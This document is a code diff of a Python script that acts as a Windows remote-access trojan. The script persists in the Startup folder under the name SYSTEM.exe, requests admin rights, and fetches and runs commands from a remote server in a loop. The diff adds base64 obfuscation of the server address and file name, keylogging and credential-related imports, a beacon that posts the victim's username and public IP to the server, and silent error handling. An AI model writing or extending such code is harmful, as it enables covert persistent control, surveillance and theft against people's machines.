@@ -1,26 +1,33 @@
 import urllib.request
 import subprocess
-import pyautogui
-import subprocess
 import shutil
-import cv2
-import PIL
-import psutil
 import threading
 import time
 import os
 import requests
 import sys
 import ctypes
+import base64
+
+# Packages for custom scripts
+
+import pyautogui
+import sqlite3
+import cryptography
+import keyboard
+import cv2
+import PIL
+import psutil
+import wmi
 
 
-server_url = "http://example.txt" # MUST BE HTTP NOT HTTPS
+server_url = base64.b64decode("DO_NOT_CHANGE_ME").decode()
 scripts_url = f"{server_url}/scripts.txt"
 check_interval = 5
 APPDATA = os.getenv("APPDATA")
 TEMP = os.getenv("TEMP")
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-SCRIPT_NAME = "SYSTEM.exe"
+SCRIPT_NAME = base64.b64decode("U1lTVEVNLmV4ZQ==").decode()
 SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)
 
 def is_admin():
@@ -72,11 +79,19 @@ def save_copy():
                 subprocess.Popen(f'{hider} "{SCRIPT_PATH}"')
     except:
         pass
+def send_alert():
+    data = {
+    "INFO": f"{os.getlogin()} with IP: {requests.get(base64.b64decode('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc=').decode()).text} has run the executable!"
+    }   
+    requests.post(f"{server_url}/reply", data=data)
+
 
 request_admin()
 if is_admin():
     subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
 save_copy()
+send_alert()
+
 while True:
     try:
         script_names = get_target_url()
@@ -87,4 +102,4 @@ while True:
 
         time.sleep(check_interval)
     except:
-        print(e)
+        pass
